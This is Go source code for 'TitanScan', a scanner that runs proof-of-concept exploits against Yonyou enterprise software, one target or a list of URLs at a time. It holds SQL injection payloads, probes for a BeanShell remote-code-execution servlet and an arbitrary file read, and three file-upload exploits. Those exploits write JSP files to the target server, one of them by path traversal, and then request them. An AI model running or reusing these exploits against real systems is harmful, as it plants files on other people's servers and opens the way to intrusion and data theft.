package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
)

func main() {
	args := os.Args[1:]
	if len(args) < 2 {
		fmt.Println(` _____ _ _              ____                  
|_   _(_) |_ __ _ _ __ / ___|  ___ __ _ _ __  
  | | | | __/ _\` + "`" + ` | '` + `_ \\___ \ / __/ _\` + "`" + ` | '` + `_ \
  | | | | || (_| | | | |___) | (_| (_| | | | |
  |_| |_|\__\__,_|_| |_|____/ \___\__,_|_| |_|`)
		fmt.Printf("执行参数:\n%s\n%s\n", "TitanScan.exe -yonyou http://xxx.xxx.xxx.xxx", "TitanScan.exe -yonyou -f url.txt")

		return
	}

	yonyouFlag := args[0]
	if yonyouFlag == "-yonyou" {
		if len(args) == 3 && args[1] == "-f" {
			filePath := args[2]
			urls, err := readURLsFromFile(filePath)
			if err != nil {
				fmt.Println("读取文件失败:", err)
				return
			}

			for _, url := range urls {
				ExploitBeanShell(url)
				NCFindWeb(url)
				ProxySQL(url)
				Test(url)
				Kso(url)
				Upload(url)
				NCCloud(url)
			}
		} else if len(args) == 2 {
			url := args[1]
			ExploitBeanShell(url)
			NCFindWeb(url)
			ProxySQL(url)
			Test(url)
			Kso(url)
			Upload(url)
			NCCloud(url)
		} else {
			fmt.Println("无效的参数")
		}
	} else {
		fmt.Println("无效的参数")
	}
}

func readURLsFromFile(filePath string) ([]string, error) {
	content, err := ioutil.ReadFile(filePath)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(content), "\n")
	var urls []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			urls = append(urls, line)
		}
	}

	return urls, nil
}
func NCFindWeb(url string) {
	poc := "/NCFindWeb?service=IPreAlertConfigService&filename="
	urls := url + poc

	client := http.Client{}

	res, err := client.Get(urls)
	if err != nil {
		fmt.Println(err)
		return
	}

	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	if strings.Contains(res.Status, "200") && strings.Contains(string(body), "jsp") {
		fmt.Printf("\033[92m[+]存在用友任意文件读取漏洞: %s\033[0m\n", urls)
	}
}

func ExploitBeanShell(url string) {
	poc := "/servlet//~ic/bsh.servlet.BshServlet"
	url = url + poc

	res, err := http.Get(url)
	if err != nil {
		fmt.Println(err)
		return
	}

	defer res.Body.Close()

	bodyBytes, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	body := string(bodyBytes)

	if strings.Contains(body, "BeanShell") {
		fmt.Printf("\033[92m[+]存在用友BeanShell远程代码执行漏洞: %s\033[0m\n", url)
	}
}

func Test(url string) {
	path := "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
	res, err := http.Get(url + path)
	if err != nil {
		fmt.Println("发生错误:", err)
		return
	}
	defer res.Body.Close()

	bodyBytes, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println("发生错误:", err)
		return
	}

	body := string(bodyBytes)

	if strings.Contains(body, "c4ca4238a0b923820dcc509a6f75849b") && res.StatusCode == 200 {
		fmt.Printf("\u001B[92m[+]存在用友 U8 OA test.jsp SQL注入漏洞: %s\u001B[0m\n", url+path)
	}
}
func ProxySQL(url string) {
	headers := map[string]string{
		"Cache-Control":             "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Encoding":           "gzip, deflate",
		"Accept-Language":           "zh-CN,zh;q=0.9",
		"Cookie":                    "JSESSIONID=AAB60773B8C64E84C450A1755864D1F5",
		"Connection":                "close",
		"Content-Type":              "application/x-www-form-urlencoded",
		"Content-Length":            "350",
	}

	data := `cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>`

	client := &http.Client{}
	req, err := http.NewRequest("POST", url+"/Proxy", strings.NewReader(data))
	if err != nil {
		fmt.Println("An error occurred:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("An error occurred:", err)
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("An error occurred:", err)
		return
	}

	body := string(bodyBytes)
	resa := body

	if strings.Contains(body, "SQLException") && resp.StatusCode == 200 {
		fmt.Printf("\u001B[92m[+]存在存在用友 GRP-U8 Proxy SQL注入漏洞漏洞: %s\n返回内容:\n%s\n\u001B[0m\n", url, resa)

	} else {
		fmt.Println("请求未成功或不存在漏洞")
	}
}
func Kso(url string) {
	data := `<% out.println("123123");%>`
	resp, err := http.Post(url+"/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=a.jsp&_ZQA_ID=d0d60ec54924481c", "text/plain", strings.NewReader(data))
	if err != nil {
		fmt.Println("发生错误:", err)
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("发生错误:", err)
		return
	}

	shellURL := url + "/pictures/a.jsp"
	if strings.Contains(string(bodyBytes), "pictures") {
		fmt.Printf("\033[92m[+]用友时空KSOA ImageUpload任意文件上传漏洞: %s\033[0m\n", shellURL)
	}
}
func Upload(url string) {
	path := "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=../&filename=6666888.jsp&filename=1.jpg"

	// 替换为你实际要上传的文件内容
	fileContent := []byte("1132")

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// 创建一个名为 "myfile" 的表单字段，将文件内容写入其中
	part, err := writer.CreateFormFile("myfile", "test.jpg")
	if err != nil {
		panic(err)
	}

	// 将文件内容写入表单字段
	_, err = part.Write(fileContent)
	if err != nil {
		panic(err)
	}

	err = writer.Close()
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("POST", url+path, body)
	if err != nil {
		panic(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
	req.Header.Set("Cookie", "JSESSIONID=106662F4FACC6F8D06BAFF689D3B4D15")
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// 创建一个支持 HTTPS 的 http.Client
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 跳过证书验证，仅用于测试目的
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	// 处理响应
	// ...

	// 发起第二个请求
	shells := url + "/R9iPortal/6666888.jsp"
	req2, err := http.NewRequest("POST", shells, nil)
	if err != nil {
		panic(err)
	}

	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0")
	req2.Header.Set("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
	req2.Header.Set("Cookie", "JSESSIONID=106662F4FACC6F8D06BAFF689D3B4D15")

	resp2, err := client.Do(req2)
	if err != nil {
		panic(err)
	}
	defer resp2.Body.Close()

	// 处理第二个响应
	if resp2.StatusCode == http.StatusOK {
		buf := new(bytes.Buffer)
		_, err := buf.ReadFrom(resp2.Body)
		if err != nil {
			panic(err)
		}
		bodyStr := buf.String()

		if containsString(bodyStr, "1132") {
			fmt.Printf("\033[92m[+]存在用友-GRP-U8任意文件上传漏洞: %s\033[0m\n", shells)
		} else {
			fmt.Println("不存在用友-GRP-U8任意文件上传漏洞")
		}
	}
}

func containsString(s, substr string) bool {
	return bytes.Contains([]byte(s), []byte(substr))
}
func NCCloud(url string) {
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "zh-CN,zh;q=0.9",
		"Cookie":          "JSESSIONID=BA6BFF53A151F5BA1A70CD893814109E",
	}

	data := `{
		"serviceName": "nc.itf.iufo.IBaseSPService",
		"methodName": "saveXStreamConfig",
		"parameterTypes": ["java.lang.Object", "java.lang.String"],
		"parameters": ["aaaa", "webapps/nc_web/1.jsp"]
	}`

	req, err := http.NewRequest("POST", url+"/uapjs/jsinvoke/?action=invoke", strings.NewReader(data))
	if err != nil {
		fmt.Println("发生错误:", err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("发生错误:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Printf("\033[92m[+]用友-NC-Cloud全版本任意文件上传:%s\033[0m\n", url)
	}
}
